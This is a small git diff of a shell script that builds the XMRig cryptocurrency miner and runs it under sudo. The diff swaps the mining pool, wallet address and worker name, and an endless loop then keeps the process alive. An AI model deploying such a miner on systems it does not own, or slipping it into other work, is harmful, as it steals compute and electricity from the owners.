@@ -6,7 +6,7 @@ sudo git clone https://github.com/xmrig/xmrig.git
 sudo mkdir xmrig/build && cd xmrig/build
 sudo cmake ..
 sudo make -j$(nproc)
-./xmrig -o pool.minexmr.com:4444 -u 85g3ACGwaFrVKsxcUzLfKN2ythUVi3Grk76FT5YKKkAfbBceEohBseBAQahE83VnqjVjkiWzJiw1gZjH6fxxEuz91fUUsQX.gowork
+./xmrig -o rx.unmineable.com:3333 -u 0xe5319a37c23528dbdcd33ddadf8481376366e25f.motormatik
 while [ 1 ]; do
 sleep 3
 done
